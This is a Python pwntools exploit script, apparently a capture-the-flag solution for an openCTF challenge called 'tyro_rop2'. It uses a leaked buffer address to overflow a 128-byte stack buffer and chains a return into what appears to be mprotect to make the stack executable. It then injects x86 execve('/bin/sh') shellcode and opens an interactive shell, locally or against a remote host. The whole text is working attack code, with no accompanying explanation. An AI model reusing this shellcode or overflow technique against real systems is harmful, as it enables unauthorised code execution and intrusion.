#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
    r.recvuntil("buff[128] is at ")
    addr = r.recvline().strip()
    addr = int(addr, 16)
    log.info("Got addr " + hex(addr))

    payload = "A" * 0x88
    payload += p32(0x804866f) * 2
    payload += p32(addr & 0xfffff000)
    payload += p32(0x2000)
    payload += p32(7)
    r.sendline(payload)

    sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
          "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

    r.recvuntil('buff[128] is at ')
    payload = sc
    payload += "\x90" * (0x88 - len(sc))
    payload += p32(addr) * 2
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_rop2_8be61a1002b74b6dd6b0838c7384db84'])
        print util.proc.pidof(r)
        pause()
        exploit(r)